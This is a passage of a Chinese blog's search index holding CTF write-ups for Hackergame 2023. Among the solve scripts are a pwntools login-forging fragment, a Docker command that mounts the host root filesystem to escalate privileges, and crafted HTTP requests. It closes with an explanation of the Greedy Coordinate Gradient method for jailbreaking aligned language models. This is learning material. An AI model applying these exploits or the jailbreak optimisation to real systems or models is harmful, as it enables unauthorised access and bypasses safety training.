( f ( test0 [ 0 ]), f ( test0 [ 1 ])) sendu ( test1 ) sendu ( test3 ) sendu ( b 'EOF' ) p . recvuntil ( 'Choice:' ) p . sendline ( b '2' ) p . recvuntil ( 'Login credential: ' ) p . sendline ( test0 [ 0 ] . decode () + ':' + f ( test0 [ 1 ]) . hexdigest () + sha1 ( test1 ) . hexdigest ()) p . interactive () \u5176\u4ed6 \u00b6 \u540e\u9762\u7684\u9898\u76ee\u5176\u5b9e\u6ca1\u600e\u4e48\u770b\uff0c\u5c31\u6682\u65f6\u5148\u4e0d\u5199\u4e86\uff0c\u7b49\u4ee5\u540e\u6709\u65f6\u95f4\u7a7a\u4e86\u7814\u7a76\u540e\u518d\u8bb0\u5f55\u4e00\u4e0b\u5427\u3002","title":"Hackergame 2023"},{"location":"ctf/writeups/hackergame2023/#hackergame-2023","text":"\u7ea6 3143 \u4e2a\u5b57 222 \u884c\u4ee3\u7801 \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 13 \u5206\u949f Abstract \u8fd9\u6b21\u5fd9\u91cc\u5077\u95f2\u505a\u7684\uff0c\u8fd8\u803d\u6401\u4e86\u4e00\u4e9b\u4e8b\u513fqaq\u3002\u7b97\u662f\u7b2c\u4e00\u6b21partly\u5b8c\u6574\u5730\u53c2\u52a0Hackergame\uff0c\u56e0\u4e3a\u662f\u9762\u5411\u521d\u5b66\u8005\u7684\u6bd4\u8d5b\uff0c\u9898\u76ee\u96be\u5ea6\u4e0d\u9ad8\u66f4\u5177\u6709\u8da3\u5473\u6027\uff0c\u7279\u6b64\u8bb0\u5f55\u4e00\u4e0b\u3002 \u4e00\u4e9b\u7b80\u5355\u7684\u9898\u76ee\u53ef\u80fd\u8bb0\u5f55\u7684\u4f1a\u6bd4\u8f83\u8349\u7387\uff0c\u4f1a\u91cd\u70b9\u8bb0\u5f55\u4e00\u4e9b\u5370\u8c61\u6df1\u523b\uff0c\u5dee\u4e00\u70b9\u5b8c\u6210\u7684\u9898\u76ee\u3002\u5bf9\u4e8e\u6ca1\u601d\u8def\u7684\u9898\u76ee\u4e5f\u7ed3\u5408\u516c\u5f00\u9898\u89e3\u8bb0\u5f55\u4e00\u4e0b\uff0c\u8865\u5145\u4e00\u4e0b\u76f8\u5173\u77e5\u8bc6\u3002 \u5b98\u65b9\u9898\u89e3","title":"Hackergame 2023"},{"location":"ctf/writeups/hackergame2023/#hackergame","text":"\u7b7e\u5230\u9898\uff0c\u76f4\u63a5\u6539GET\u8bf7\u6c42\u53c2\u6570\u91cc\u7684Similarity","title":"Hackergame \u542f\u52a8"},{"location":"ctf/writeups/hackergame2023/#_1","text":"\u8003\u9a8c\u641c\u7d22\u80fd\u529b\uff0c\u90fd\u5f88\u597d\u641c\uff0cGoogle\u4e00\u4e0b\u4f60\u5c31\u77e5\u9053","title":"\u732b\u54aa\u5c0f\u6d4b"},{"location":"ctf/writeups/hackergame2023/#_2","text":"\u9047\u4e8b\u4e0d\u51b3 F12\uff0c\u968f\u4fbf\u6eda\u4e00\u4e0b\u5c31\u627e\u5230\u4e86flag\uff08\u771f\u7684\uff0c\u90fd\u662f\u8fd0\u6c14","title":"\u66f4\u6df1\u66f4\u6697"},{"location":"ctf/writeups/hackergame2023/#30","text":"\u8fd8\u86ee\u6709\u610f\u601d\u7684\u793e\u5de5\u9898\uff0c\u8fd8\u662f\u6bd4\u8f83\u7b80\u5355\u7684 \u4ece\u65e5\u672c\u3001\u5b66\u672f\u4f1a\u8bae\u5165\u624b\uff0c\u5f88\u5bb9\u6613\u53d1\u73b0\u4f1a\u8bae\u540d\u79f0\u4ee5\u53ca\u5730\u70b9\u4e3a\u4e1c\u4eac\u5927\u5b66\uff0c\u6839\u636e\u5730\u56fe\u9a8c\u8bc1\u4e00\u4e0b\u5c31\u53d1\u73b0\u4e86\u90a3\u5bb6\u62c9\u9762\u9986\u3002 \u4e8e\u662f\u6839\u636e\u8981\u6c42\u67e5\u4e00\u4e0b\u4f1a\u8bae\u4e3e\u529e\u65e5\u671f\uff0c\u4ee5\u53ca\u4e1c\u4eac\u5927\u5b66\u8bfa\u8d1d\u5c14\u7269\u7406\u5b66\u5956\u83b7\u5f97\u8005\uff0c\u5f88\u5bb9\u6613\u89e3\u51fa\u7b2c\u4e00\u90e8\u5206\u7684\u7b54\u6848\u3002 \u7b2c\u4e8c\u90e8\u5206\u521a\u5f00\u59cb\u5361\u4e86\u5f88\u4e45\uff0c\u6ca1\u60f3\u5230\u9644\u8fd1\u8d70\u8d70\u5c45\u7136\u8d70\u90a3\u4e48\u8fdc\uff0c\u8fd8\u662f\u9760\u4e0a\u91ce\u7ad9\u8fd9\u4e00\u4e2a\u5173\u952e\u5730\u70b9\u624d\u53d1\u73b0\u539f\u6765\u8d70\u4e86\u90a3\u4e48\u8fdc\uff0c\u90a3\u5c31\u5f88\u597d\u5b9a\u4f4d\u5230\u56fd\u7acb\u535a\u7269\u9986\u548c\u4e0a\u91ce\u516c\u56ed\u3002\u6839\u636e\u65e5\u671f\u548c\u5730\u70b9\u80fd\u641c\u5230\u4e00\u4e2a\u9152\u7684\u5c55\u89c8\u4f1a\uff0c\u7f51\u7ad9\u91cc\u627e\u5230Staff\u62db\u52df\uff0c\u7b2c\u4e8c\u90e8\u5206\u5c31\u5b8c\u6210\u4e86\u3002 \u7b2c\u4e09\u90e8\u5206\u7b2c\u4e00\u95ee\u76f4\u63a5\u770b\u4f1a\u8bae\u5b98\u7f51\u7684\u901a\u77e5\u5373\u53ef\uff0c\u7b2c\u4e8c\u90e8\u5206\uff0c\u6d77\u62a5\u76f4\u63a5\u4e0aTwitter\u641c\u4e86\u4e00\u4e0b\u5c31\u51fa\u6765\u4e86\u3002\u5173\u4e8e 3D \u52a8\u7269\u7684\u8bdd\u80af\u5b9a\u6709\u76f8\u5173\u62a5\u9053\uff0c\u67e5\u4e86\u4e00\u4e0b\u6709\u732b\u6709\u72d7\uff0c\u8bd5\u4e00\u4e0b\u5c31\u51fa\u6765\u4e86\u3002","title":"\u65c5\u884c\u7167\u7247 3.0"},{"location":"ctf/writeups/hackergame2023/#_3","text":"\u540e\u7aef\u6ca1\u6709\u505a\u4f4d\u7f6e\u662f\u5426\u5360\u7528\u68c0\u67e5\uff0c\u6240\u4ee5\u53ea\u8981\u7ed5\u8fc7\u524d\u7aef\u68c0\u67e5\u5c31\u80fd\u83b7\u5f97\u80dc\u5229\u3002","title":"\u8d5b\u535a\u4e95\u5b57\u68cb"},{"location":"ctf/writeups/hackergame2023/#flag","text":"\u6839\u636e\u9898\u5e72\u63d0\u5230\u7684 Google\u4eb2\u513f\u5b50 \u731c\u6d4b\u548cPixels\u6709\u5173\uff0c\u5584\u7528\u641c\u7d22\u53d1\u73b0\u662fPixels\u7684\u56fe\u50cf\u88c1\u526a\u6f0f\u6d1e\uff0c\u76f4\u63a5\u5c06PNG\u6587\u4ef6\u7684END\u6570\u636e\u5757\u6dfb\u52a0\u5230\u76f8\u5e94\u4f4d\u7f6e\uff0c\u5e76\u6ca1\u6709\u5220\u9664\u88ab\u88c1\u526a\u7684\u6570\u636e\uff0c\u6240\u4ee5\u53ef\u4ee5\u6839\u636e\u578b\u53f7\u4fee\u6539\u4e00\u4e0b\u957f\u5bbd\u5e76\u5220\u9664\u76f8\u5e94\u6570\u636e\u5757\u5373\u53ef\u3002 \u7f51\u4e0a\u5176\u5b9e\u6709\u76f8\u5e94\u5de5\u5177\u53ef\u4ee5\u4e00\u628a\u68ad\u3002","title":"\u5976\u5976\u7684\u7761\u524d flag \u6545\u4e8b"},{"location":"ctf/writeups/hackergame2023/#_4","text":"\u7ec8\u4e8e\u6709\u4e00\u9053\u9700\u8981\u5199\u811a\u672c\u7684\u9898\u76ee\u4e86\uff08x \u76f4\u63a5F12\u770b\u6e90\u7801\uff0c\u53d1\u73b0\u540e\u7aef\u662f\u4e00\u6b21\u6027\u628a\u6240\u6709\u6d88\u606f\u90fd\u53d1\u8fc7\u6765\uff0c\u90a3\u5c31\u5f88\u7b80\u5355\uff0c\u4e4b\u95f4\u627e\u51fa\u6ee1\u8db3\u8981\u6c42\u7684\u6d88\u606f\u7136\u540e\u53d1\u8d77\u64a4\u56de\u8bf7\u6c42\u5373\u53ef\u3002\u4e0d\u8fc7\u4e0d\u80fd\u4e00\u6b21\u6027\u90fd\u64a4\u56de\uff0c\u540e\u7aef\u6709Delay\u65f6\u95f4\u8981\u6c42\uff0c\u53ef\u4ee5\u6839\u636e\u6d88\u606f\u5185\u7684Delay\u4fe1\u606f\u5ef6\u8fdf\u540e\u53d1\u9001\uff0c\u5f53\u7136\u4e5f\u53ef\u4ee5\u4e00\u76f4\u53d1\u9001\u76f4\u5230\u6210\u529f\u5373\u53ef\uff08\u4e3b\u8981\u7701\u529b\u65e0\u8111 \u89e3\u9898\u4ee3\u7801\uff08\u614e\u7528\uff0c\u6982\u7387\u4e8b\u4ef6\uff0c\u591a\u8bd5\u51e0\u6b21\u5c31\u597d\uff09 import requests import json from time import sleep cookies = { 'session' : 'token' } msg = requests . post ( 'http://202.38.93.111:10021/api/getMessages' , cookies = cookies ) msg = json . loads ( msg . text ) msg = msg [ 'messages' ] def back ( idx ): back = requests . post ( 'http://202.38.93.111:10021/api/deleteMessage' , cookies = cookies , json = { 'id' : idx }) try : back = json . loads ( back . text ) except : print ( 'err:' + back . text ) return back for id , i in enumerate ( msg ): if 'hack[' in i [ 'text' ]: t = back ( id ) # \u8fd9\u91cc\u53ef\u4ee5\u4f18\u5316\u4e00\u4e0b\uff0c\u4e0d\u8fc7\u61d2\u764c\u72af\u4e86 while ( t . get ( 'error' ) == '\u68c0\u6d4b\u5230\u65f6\u7a7a\u7a7f\u8d8a' ): t = back ( id ) # print(id, t) flag = requests . post ( 'http://202.38.93.111:10021/api/getflag' , cookies = cookies ) flag = json . loads ( flag . text ) print ( flag )","title":"\u7ec4\u59d4\u4f1a\u6a21\u62df\u5668"},{"location":"ctf/writeups/hackergame2023/#_5","text":"\u771f\u662f\u975e\u5e38\u5de7\uff0c\u4e4b\u524d\u5c31\u5237\u5230\u8fc7\u65e0\u7ebf\u7535\u3001SSTV\u76f8\u5173\u7684\u77e5\u8bc6\uff0c\u8fd9\u6b21\u5c45\u7136\u521a\u597d\u78b0\u4e0a\u4e86\uff0c\u4e0d\u8fc7Windows\u7aef\u90a3\u4e2a\u8f6f\u4ef6\u4e0d\u600e\u4e48\u4f1a\u7528\uff0c\u770b\u5230\u624b\u673a\u7aef\u6709\u76f8\u5e94\u7684\u50bb\u74dc\u5f0f\u6536\u53d1\u8f6f\u4ef6\uff08\u4e0d\u8fc7\u662fAndroid\uff0c\u4e8e\u662f\u62ff\u51fa\u4e86\u5907\u7528\u673a\uff09\u5f88\u8f7b\u677e\u83b7\u5f97\u4e86\u7ed3\u679c\u3002 \u4e0d\u653e\u56fe\u4e86\uff0c\u5360\u4ed3\u5e93\u7a7a\u95f4\uff0c\u7b49\u4ee5\u540e\u641e\u4e2a\u56fe\u5e8a\u6216SVG","title":"\u866b"},{"location":"ctf/writeups/hackergame2023/#json-yaml","text":"\u5b66\u4e60\u4e86\u4e00\u4e0b Yaml\uff0c\u6839\u636eYaml 1.1\u4e0e1.2\u7684\u5dee\u5f02\uff0c\u53d1\u73b0Yaml 1.1\u65e0\u6cd5\u89e3\u6790\u5f62\u5982 1e3 \u8fd9\u6837\u7684\u6570\u5b57\uff0c\u4f1a\u5c06\u5176\u89e3\u6790\u4e3a\u5b57\u7b26\u4e32\uff0c\u8fd9\u6837\u7b2c\u4e00\u5c0f\u95ee\u5c31\u89e3\u51b3\u4e86\u3002 \u7b2c\u4e8c\u5c0f\u95ee\u6839\u636e\u641c\u7d22\u5f97\u5230 \u8fd9\u4e2a\u95ee\u9898 \u53ef\u77e5\u9053Yaml\u8981\u6c42\u952e\u503c\u662f\u552f\u4e00\u7684\u5426\u5219\u4f1a\u62a5\u9519\uff0c\u800cJSON\u6ca1\u6709\u8fd9\u4e2a\u8981\u6c42\uff0c\u8fd9\u6837\u5c31\u89e3\u5b8c\u4e86\u3002","title":"JSON \u2282 YAML?"},{"location":"ctf/writeups/hackergame2023/#git-git","text":"\u8fd9\u9898\u975e\u5e38\u7684easy\uff0c\u76f4\u63a5 git reflog \uff0c\u518d git reset \u5c31\u7ed3\u675f\u4e86\u3002","title":"Git? Git!"},{"location":"ctf/writeups/hackergame2023/#http","text":"\u5927\u81f4\u5c31\u662f\u4e0d\u65ad\u67e5\u6587\u6863\uff0c\u8fd9\u91cc\u5c31\u76f4\u63a5\u642c\u5b98\u65b9\u9898\u89e3\u4e86 \u5b98\u65b9\u9898\u89e3 200 OK. \u70b9\u51fb\u5c31\u9001\uff0c\u4ee3\u8868\u8bf7\u6c42\u6210\u529f\u3002 GET / HTTP/1.1\\r\\n Host: example.com\\r\\n\\r\\n 404 Not Found. \u4fee\u6539\u8def\u5f84\u5230\u4e00\u4e2a\u4e0d\u5b58\u5728\u7684\u6587\u4ef6\u5373\u53ef\u3002 GET /x HTTP/1.1\\r\\n Host: example.com\\r\\n\\r\\n 400 Bad Request. \u6784\u9020\u4e0d\u7b26\u5408\u683c\u5f0f\u7684 HTTP \u8bf7\u6c42\u5373\u53ef\u3002 GET / aHTTP/1.1\\r\\n Host: example.com\\r\\n\\r\\n 505 HTTP Version Not Supported. \u4fee\u6539 HTTP \u7248\u672c\u53f7\u5230\u4e00\u4e2a\u79bb\u8c31\u7684\u503c\u5373\u53ef\u3002 GET / HTTP/11\\r\\n Host: example.com\\r\\n\\r\\n 405 Method Not Allowed. \u4fee\u6539\u8bf7\u6c42\u65b9\u6cd5\u5230 POST \u7b49\u5373\u53ef\u3002 POST / HTTP/1.1\\r\\n Host: example.com\\r\\n\\r\\n \u63a5\u4e0b\u6765\u662f\u53ef\u80fd\u9700\u8981\u770b\u6587\u6863\u7684\u90e8\u5206\uff1a 100 Continue. \u4ee3\u8868\u670d\u52a1\u5668\u5e0c\u671b\u5ba2\u6237\u7aef\u7ee7\u7eed\u8bf7\u6c42\u6216\u8005\u5ffd\u7565\u3002\u9700\u8981\u5ba2\u6237\u7aef\u53d1\u9001 Expect: 100-continue \u3002 GET / HTTP/1.1\\r\\n Host: example.com\\r\\n Expect: 100-continue\\r\\n\\r\\n 206 Partial Content. \u4e00\u4e2a HTTP \u8bf7\u6c42\u53ef\u4ee5\u53ea\u8bf7\u6c42\u90e8\u5206\u5185\u5bb9\uff0c\u670d\u52a1\u5668\u4e5f\u4f1a\u8fd4\u56de\u90e8\u5206\u5185\u5bb9\u3002 GET / HTTP/1.1\\r\\n Host: example.com\\r\\n Range: bytes=1-2\\r\\n\\r\\n 416 Range Not Satisfiable. \u4e0a\u9762\u7684 Range \u662f\u4e00\u4e2a\u5408\u6cd5\u7684\u8303\u56f4\uff0c\u90a3\u4e48\u4e0d\u5408\u6cd5\u7684\u8303\u56f4\u5462\uff1f\u5c31\u662f 416\u3002 GET / HTTP/1.1\\r\\n Host: example.com\\r\\n Range: bytes=114514-1919810\\r\\n\\r\\n 304 Not Modified. \u4ee3\u8868\u6587\u4ef6\u5728\u6307\u5b9a\u6761\u4ef6\u4e0b\u6ca1\u6709\u4fee\u6539\u8fc7\uff0c\u8fd9\u91cc\u7528 If-Modified-Since \uff1a GET / HTTP/1.1\\r\\n Host: example.com\\r\\n If-Modified-Since: Tue, 15 Aug 2023 17:03:04 GMT\\r\\n\\r\\n 412 Precondition Failed. \u8fd9\u4e2a payload \u4f7f\u7528\u4e86 ETag + If-Match\uff0cETag \u548c\u5bf9\u5e94\u7684 web \u8d44\u6e90\u5bf9\u5e94\uff0c\u7528\u6765\u533a\u5206\u5bf9\u5e94\u8d44\u6e90\u4e0d\u540c\u7684\u7248\u672c\u3002\u5ba2\u6237\u7aef\u53ef\u4ee5\u5229\u7528\u8fd9\u4e2a\u4fe1\u606f\u6765\u8282\u7701\u5e26\u5bbd\u3002\u8fd9\u91cc If-Match \u5219\u5728\u5c1d\u8bd5\u5339\u914d\u8fd9\u4e2a ETag\uff0c\u5982\u679c\u4e0d\u5339\u914d\uff0c\u90a3\u5c31\u8fd4\u56de 412\u3002 GET / HTTP/1.1\\r\\n Host: example.com\\r\\n If-Match: \"bfc13a64729c4290ef5b2c2730249c88ca92d82d\"\\r\\n\\r\\n 413 Content Too Large. \u4e0d\u9700\u8981\u771f\u6b63\u8f93\u5165\u5f88\u5927\u7684 payload\uff0c\u628a Content-length \u5f04\u5f97\u5f88\u5927\u5c31\u884c\uff1a GET / HTTP/1.1\\r\\n Host: example.com\\r\\n Content-length: 1145141919810\\r\\n\\r\\n 414 URI Too Long. \u5927\u6982\u9700\u8981\u5f88\u957f\u7684 URI \u8def\u5f84\uff08\u4f46\u662f\u53c8\u4e0d\u80fd\u592a\u957f\uff0c\u5426\u5219 web \u754c\u9762\u672c\u4f53\u4e0d\u4f1a\u5141\u8bb8\u8fd9\u6837\u7684\u54cd\u5e94\uff09\u3002\u5185\u5bb9\u8be6\u89c1 414.txt \u3002 \u4ee5\u4e0a\u5c31\u5df2\u7ecf\u96c6\u6ee1\u4e86 12 \u4e2a\u3002\u5728\u9a8c\u9898\u65f6\u8fd8\u6709\u4e00\u4e2a HTTP code \u6f0f\u4e86\uff1a 501 Not Implemented. \u4ee3\u8868\u670d\u52a1\u5668\u4e0d\u652f\u6301\u6b64\u529f\u80fd\u3002Nginx \u6e90\u4ee3\u7801\u4e2d\u9ed8\u8ba4\u914d\u7f6e\u4e0b\u552f\u4e00\u53ef\u80fd\u89e6\u53d1\u7684\u5730\u65b9\u662f https://github.com/nginx/nginx/blob/a13ed7f5ed5bebdc0b9217ffafb75ab69f835a84/src/http/ngx_http_request.c#L2008 : } else { ngx_log_error ( NGX_LOG_INFO , r -> connection -> log , 0 , \"client sent unknown \\\" Transfer-Encoding \\\" : \\\" %V \\\" \" , & r -> headers_in . transfer_encoding -> value ); ngx_http_finalize_request ( r , NGX_HTTP_NOT_IMPLEMENTED ); return NGX_ERROR ; } else \u4e0a\u9762\u53ea\u5141\u8bb8 chunked \uff0c\u6240\u4ee5\u53ef\u4ee5\uff1a GET / HTTP/1.1\\r\\n Transfer-Encoding: gzip\\r\\n Host: example.com\\r\\n\\r\\n gzip \u6362\u6210\u9664\u4e86 chunked \u4ee5\u5916\u7684\u4efb\u610f\u5b57\u7b26\u4e32\u90fd\u884c\u3002 \u6700\u540e\u4e00\u4e2a\u95ee\u9898\uff1a\u6ca1\u6709\u72b6\u6001\u7801\u662f\u600e\u4e48\u56de\u4e8b\uff1f GET /\\r\\n \u8fd9\u91cc\u5b9e\u9645\u53d1\u9001\u7684\u662f HTTP/0.9 \u8bf7\u6c42\uff0c\u5b83\u53ea\u652f\u6301 GET \uff0c\u7136\u540e\u540e\u9762\u76f4\u63a5\u63a5 URL\uff0c\u6ca1\u6709\u522b\u7684\u3002\u7136\u540e\u54cd\u5e94\u5c31\u76f4\u63a5\u54cd\u5e94\u6587\u4ef6\u5185\u5bb9\uff0c\u4e5f\u6ca1\u6709\u72b6\u6001\u7801\u4e4b\u7c7b\u7684\u4e1c\u897f\u3002","title":"HTTP \u96c6\u90ae\u518c"},{"location":"ctf/writeups/hackergame2023/#docker-for-everyone","text":"\u8fd9\u9898\u8003\u70b9\u5c31\u662fdocker\u7528\u6237\u7ec4\u4e0eroot\u5176\u5b9e\u662f\u7b49\u4ef7\u7684\uff0c\u56e0\u6b64\u76f4\u63a5\u542f\u52a8\u4e00\u4e2a\u5bb9\u5668\u628aflag\u6302\u8f7d\u8fdb\u5bb9\u5668\u5373\u53ef\u5728\u5bb9\u5668\u5185\u8bfb\u53d6\u3002\u53e6\u5916\u6ce8\u610f\u4e00\u4e0b\u8f6f\u8fde\u63a5\u7684\u95ee\u9898\u5373\u53ef\u3002 docker run -it --rm -v /:/outside alpine","title":"Docker for Everyone"},{"location":"ctf/writeups/hackergame2023/#20","text":"\u76f4\u63a5\u66b4\u529b\u7a77\u4e3e\u5373\u53ef\uff0c\u5176\u5b9e\u6ee1\u8db3\u6761\u4ef6\u7684\u60c5\u51b5\u5f88\u591a\uff0c\u76f4\u63a5\u8fb9\u8dd1\u8fb9\u8f93\u51fa\u5c31\u5f88\u5feb\u80fd\u62ff\u5230flag\u4e86\u3002 \u89e3\u9898\u4ee3\u7801\uff08\u8fc7\u4e8e\u66b4\u529b\uff09 cod_dict = [] cod_dict += [ 'nymeh1niwemflcir}echaet' ] cod_dict += [ 'a3g7}kidgojernoetlsup?h' ] cod_dict += [ 'ulw!f5soadrhwnrsnstnoeq' ] cod_dict += [ 'ct{l-findiehaai{oveatas' ] cod_dict += [ 'ty9kxborszstguyd?!blm-p' ] def get_cod_dict ( c_dict ): return '' . join ( c_dict ) def decrypt_data ( input_codes ): flags = [] for k in range ( 23 ): print ( k ) for j in range ( 23 ): for t in range ( 23 ): for p in range ( 23 ): for f in range ( 23 ): cd_dict = cod_dict . copy () cd_dict [ 0 ] = cod_dict [ 0 ][: k ] + cod_dict [ 0 ][ k ] + cod_dict [ 0 ][ k :] cd_dict [ 1 ] = cod_dict [ 1 ][: j ] + cod_dict [ 1 ][ j ] + cod_dict [ 1 ][ j :] cd_dict [ 2 ] = cod_dict [ 2 ][: t ] + cod_dict [ 2 ][ t ] + cod_dict [ 2 ][ t :] cd_dict [ 3 ] = cod_dict [ 3 ][: p ] + cod_dict [ 3 ][ p ] + cod_dict [ 3 ][ p :] cd_dict [ 4 ] = cod_dict [ 4 ][: f ] + cod_dict [ 4 ][ f ] + cod_dict [ 4 ][ f :] print ( cd_dict ) st_dict = get_cod_dict ( cd_dict ) output_chars = [ st_dict [ c ] for c in input_codes ] if 'flag{' in '' . join ( output_chars ): flags . append ( '' . join ( output_chars )) return flags flags = decrypt_data ([ 53 , 41 , 85 , 109 , 75 , 1 , 33 , 48 , 77 , 90 , 17 , 118 , 36 , 25 , 13 , 89 , 90 , 3 , 63 , 25 , 31 , 77 , 27 , 60 , 3 , 118 , 24 , 62 , 54 , 61 , 25 , 63 , 77 , 36 , 5 , 32 , 60 , 67 , 113 , 28 ]) print ( set ( flags ))","title":"\u60dc\u5b57\u5982\u91d1 2.0"},{"location":"ctf/writeups/hackergame2023/#_6","text":"\u9898\u76ee\u4e2d\u7ed9\u7684\u662fasciinema\u5f55\u50cf\u6587\u4ef6\uff0c\u76f4\u63a5 asciinema cat \u5373\u53ef\u5f97\u5230\u5b57\u8282\u6d41\uff0c\u4e0d\u8fc7\u4f1a\u6709\u5f88\u591a\u989d\u5916\u4e0d\u9700\u8981\u7684\u4e1c\u897f\uff0c\u5220\u8d77\u6765\u6bd4\u8f83\u9ebb\u70e6\uff0c\u770b\u5230asciinema\u5f55\u5236\u7684\u65f6\u5019\u6709raw\u9009\u9879\uff0c\u4e8e\u662f\u91cd\u65b0\u5f55\u4e86\u4e00\u904d\uff0c\u8fd9\u6837\u5b57\u8282\u6d41\u5c31\u5e72\u51c0\u5f88\u591a\uff0c\u7a0d\u5fae\u6539\u4e00\u4e0b\uff0c\u8fd0\u884c\u5373\u53ef\u3002","title":"\ud83e\ude90 \u9ad8\u9891\u7387\u661f\u7403"},{"location":"ctf/writeups/hackergame2023/#_7","text":"\u5f88\u65b0\u9896\u7684AI\u9898\u76ee\uff0c\u5bf9\u4e8e\u6211\u6765\u8bf4\u53ea\u80fd\u4e71\u8bd5\uff0c\u7b2c\u4e00\u95ee\u76f4\u63a5\u7528repeat\u5927\u6cd5\u5c31\u53ef\u5b8c\u6210\u3002 \u7b2c\u4e8c\u95ee\u5176\u5b9e\u601d\u8def\u5bf9\u7684\uff0c\u4e0d\u8fc7\u6211\u5acc\u9ebb\u70e6\uff0c\u6ca1\u6709\u53bb\u7a77\u4e3ehhh\u3002 \u540e\u9762\u4e24\u95ee\u786e\u5b9e\u53ef\u4ee5\u7684\uff0c\u5b66\u4e60\u4e86\u3002 \u5b98\u65b9\u9898\u89e3","title":"\ud83e\ude90 \u5c0f\u578b\u5927\u8bed\u8a00\u6a21\u578b\u661f\u7403"},{"location":"ctf/writeups/hackergame2023/#llm-attacks","text":"\u8bba\u6587\uff1a Universal and Transferable Adversarial Attacks on Aligned Language Models","title":"LLM Attacks"},{"location":"ctf/writeups/hackergame2023/#background","text":"\u4e00\u4e2a Decoder-Only \u7684 LLM \u5c06\u4e00\u4e32 token \\(x_{1:n}\\) \u6620\u5c04\u5230\u4e0b\u4e00\u4e2a token \\(x_{n+1}\\) \u3002\u8bed\u8a00\u6a21\u578b\u6240\u9700\u8981\u5b66\u4e60\u7684\u5219\u662f\u5728\u7ed9\u5b9a\u4e4b\u524d\u7684 token \\(x_{1:n}\\) \uff0c\u5f97\u5230\u4e0b\u4e00\u4e2a token \\(x_{n+1}\\) \u7684\u6982\u7387 \\(p(x_{n+1} | x_{1:n})\\) \u3002\u5176\u4e2d\u6bcf\u4e00\u4e2a \\(x_i \\in {1, ... V}\\) \u90fd\u662f\u8bcd\u8868\u4e2d\u7684\u4e00\u4e2a token\u3002\u5982\u679c\u60f3\u8981\u8ba9\u6a21\u578b\u8f93\u5165\u4e00\u6bb5\u5e8f\u5217\uff0c\u5e8f\u5217\u4e2d\u6bcf\u4e00\u4e2a token \u90fd\u53ea\u4e0e\u4e4b\u524d\u7684\u6240\u6709 token \u6709\u5173\uff0c\u56e0\u6b64\u6a21\u578b\u8f93\u51fa\u4e00\u6bb5\u5e8f\u5217 \\(x_{n+1:n+H}\\) \u7684\u6982\u7387\u4e3a \\[p(x_{n+1:n+H}|x_{1:n}) = \\prod_{i=1}^H p(x_{n+i} | x_{1:n+i-1})\\]","title":"Background"},{"location":"ctf/writeups/hackergame2023/#method","text":"\u5982\u679c\u6211\u4eec\u5e0c\u671b\u6a21\u578b\u80fd\u591f\u8f93\u51fa\u4e00\u4e2a\u6307\u5b9a\u7684\u5e8f\u5217\uff0c\u5c31\u662f\u5e0c\u671b \\(p(x_{n+1:n+H}|x_{1:n})\\) \u5c3d\u53ef\u80fd\u9ad8\uff0c\u4ee5\u6b64\u51fa\u53d1\uff0c\u6211\u4eec\u53ef\u4ee5\u5f97\u5230\u4f18\u5316\u76ee\u6807 \\[\\mathcal{L}(x_{1:n}) = -\\log p(x^\\star_{n+1:n+H} | x_{1:n})\\] \u4f46\u662f\u4e0e\u5e38\u89c1\u7684\u56fe\u7247\u4e0a\u9762\u7684\u5bf9\u6297\u6837\u672c\u653b\u51fb\u4e0d\u540c\uff0cLLM \u7684\u8f93\u5165\u662f\u76f8\u5bf9\u79bb\u6563\u7684 token\uff0c\u65e0\u6cd5\u8fdb\u884c\u8fde\u7eed\u7684\u53d8\u5316\u3002\u56e0\u6b64\u4f5c\u8005\u6839\u636e AutoPrompt [1]\uff0c\u8bbe\u8ba1\u4e86 Greedy Coordinate Gradient \u6765\u5c3d\u53ef\u80fd\u9ad8\u6548\u5730\u5bf9\u79bb\u6563\u7684\u8f93\u5165\u8fdb\u884c\u4f18\u5316\u3002 \u901a\u4fd7\u6765\u8bb2\uff0c\u6211\u4eec\u5e0c\u671b\u80fd\u591f\u5c06\u539f\u6709\u8f93\u5165\u7684 Prompt \u4e2d\u7684\u67d0\u4e00\u4e9b token \u66ff\u6362\u4e3a\u65b0\u7684 token\uff0c\u5e76\u4e14\u8ba9\u66ff\u6362\u4e4b\u540e\u5c3d\u53ef\u80fd\u8ba9\u8f93\u51fa\u7684 target loss \u5c3d\u53ef\u80fd\u964d\u4f4e\u3002 \u4f5c\u8005\u7528\u4e00\u4e2a\u957f\u5ea6\u4e3a \\(V\\) \u7684 one hot \u5411\u91cf\u6765\u4ee3\u8868\u5f53\u524d\u4f4d\u7f6e\u7684 token\uff0c\u8be5 one hot \u5411\u91cf\u4e0e embedding layer\uff08\u5927\u5c0f\u4e3a \\(R^{\\mathrm{dim} \\times V}\\) \uff09\u76f8\u4e58\u540e\u53ef\u4ee5\u5f97\u5230\u8be5 token \u5bf9\u5e94\u7684 embedding\uff0c\u8be5 embedding \u88ab\u8f93\u5165\u7ed9\u4e86\u6a21\u578b\u3002\u5728\u53cd\u5411\u4f20\u64ad\u540e\uff0cone hot \u5411\u91cf\u7684\u6bcf\u4e00\u4e2a\u4f4d\u7f6e \\(i\\) \u90fd\u6709\u5bf9\u5e94\u7684\u68af\u5ea6 \\(\\mathrm{grad}_i\\) \uff0c \\(\\mathrm{grad}_i < 0\\) \u8bf4\u660e\u5982\u679c\u5c06\u539f\u672c\u7684 token \u66ff\u6362\u4e3a\u8bcd\u8868\u4e2d\u7684\u7b2c \\(i\\) \u4e2a token\uff0c\u80fd\u591f\u4f7f\u5f97\u8f93\u51fa\u7684 loss \u4e0b\u964d\u3002 \u57fa\u4e8e\u8fd9\u4e2a\u68af\u5ea6\uff0c\u6211\u4eec\u9009\u51fa\u4e86 top-k \u4e2a\u6700\u5c0f\u7684\u66ff\u6362 token\uff08\u7b97\u6cd5\u7684\u7b2c 4 \u884c\uff09\u3002\u7136\u540e\u6211\u4eec\u968f\u673a\u9009\u62e9 prompt \u7684 token \u7684\u4f4d\u7f6e\uff0c\u5c06\u5176\u968f\u673a\u66ff\u6362\u4e3a\u68af\u5ea6\u6700\u5c0f\u7684 k \u4e2a\u4e4b\u4e00\u3002\u91cd\u590d\u4e0a\u8ff0\u66ff\u6362\u591a\u6b21\uff0c\u9009\u62e9\u51fa\u66ff\u6362\u540e loss \u6700\u5c0f\u7684 prompt \u4f5c\u4e3a\u4e0b\u4e00\u6b21\u8fed\u4ee3\u7684\u521d\u59cb\u503c\u3002 [1]: AutoPrompt: Eliciting Knowledge from Language Models with Automatically Generated Prompts. 